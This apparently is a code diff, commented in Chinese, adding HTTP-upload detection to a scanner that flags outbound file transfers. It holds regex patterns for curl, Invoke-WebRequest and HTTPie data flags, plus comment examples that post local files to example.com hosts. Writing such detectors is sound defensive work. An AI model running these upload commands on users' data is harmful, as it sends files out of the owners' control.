@@ -70,6 +70,74 @@ RE_PROTO = re.compile(
     re.IGNORECASE,
 )
 
+# ── HTTP 上传（curl / wget / Invoke-WebRequest）──
+#
+# ⚠️ 光看到 curl 不算 —— 它太常见了，而且大部分是好用的：
+#
+#        curl https://api.example.com/data.json    ← 下载，正常
+#        curl -O https://dl.example.com/x.zip      ← 下载，正常
+#        curl -X POST ... -d @file                 ← **往外送数据**
+#        curl -F "f=@report.docx" ...              ← **往外送文件**
+#        curl --upload-file x.zip ...              ← **往外送文件**
+#
+#    所以只认"带数据"的那个参数：
+#        -d / --data / -F / --form / -T / --upload-file
+#        Invoke-WebRequest 的 -Body / -InFile / -Method Post
+#
+#    实测（2026-11-06）：不加这条，
+#        `curl -X POST http://example.com/upload -d @file.txt` 扫不出来。
+RE_HTTP_UPLOAD = re.compile(
+    # curl 带数据
+    r"\bcurl\b[^\n|&;]*?"
+    r"(?:(\s-d\s|\s--data(?:-raw|-binary|-urlencode)?\s"
+    r"|\s-F\s|\s--form\s|\s-T\s|\s--upload-file\s))",
+    re.IGNORECASE,
+)
+
+
+def _looks_like_http_upload(text: str) -> bool:
+    r"""这条文本里有没有"用 HTTP 把数据往外送"的动作。
+
+    ⚠️ 光有 curl 不算，必须带上传参数。
+       wget 只下载不上传，不管。
+       PowerShell 的 Invoke-WebRequest 只认 -Post + Body/InFile 的组合。
+
+    ⚠️ 参数前面的分隔符不能写成 (?:^|\s)。
+       实测（2026-11-06）：前面那段 [^\n|&;]*? 已经把空格吃掉了，
+       再要求 (^|\s) 就永远匹配不上 ——
+       于是 `curl --data-binary @x` 和 `curl -F ...` 全漏了。
+
+       改用它前面必须是空白/行首的**零宽断言**： (?<=\s)|$
+    """
+    low = text.lower()
+
+    # curl 带 -d / --data* / -F / -T / --upload-file
+    if re.search(
+        r"(?:(?<=\s)|^)curl\s"
+        r"[^\n|&;]{0,400}?"
+        r"(?:(?<=\s)|^)"
+        r"(?:-d|--data(?:-raw|-binary|-urlencode)?|-f|--form|-t|--upload-file)"
+        r"(?:\s|=)",
+        low,
+    ):
+        return True
+
+    # Invoke-WebRequest / iwr / irm 带 -Body 或 -InFile
+    if re.search(r"\b(?:invoke-webrequest|iwr|irm)\b", low):
+        if re.search(r"-(?:body|infile)\b", low):
+            return True
+
+    # HTTPie：http POST/PUT/PATCH <url>
+    if re.search(r"\bhttp\s+(?:put|post|patch)\s+\S+", low):
+        return True
+
+    # 顺手兜一下：curl 后面直接跟 --upload-file / -T（前面没有别的参数）
+    if re.search(r"\bcurl\s+(?:--upload-file|-t)\s", low):
+        return True
+
+    return False
+
+
 # ── 中文"往外发"的说法 ──
 RE_CN_SEND = re.compile(
     r"(发送|上传|传|发|同步|备份|转发)到\s*"
@@ -143,6 +211,23 @@ def scan(text: str, own_emails: list[str] | None = None,
             "kind": "protocol",
             "hit": m.group(0)[:40],
             "why": "内容里有一条【往外传文件】的命令",
+        })
+
+    # ── 三·五、HTTP 上传 ──
+    #
+    # ⚠️ 单独一条，因为 curl 太常见了 ——
+    #    只拦"带数据的"，不拦"下载的"。判断逻辑在 _looks_like_http_upload。
+    if _looks_like_http_upload(text):
+        # 把那条命令抠出来给用户看
+        snippet = ""
+        for line in text.splitlines():
+            if _looks_like_http_upload(line):
+                snippet = line.strip()[:80]
+                break
+        hits.append({
+            "kind": "http_upload",
+            "hit": snippet or "curl/wget 上传",
+            "why": "内容里有一条【用 HTTP 把数据送出去】的命令",
         })
 
     # ── 四、中文"发送到 X" ──
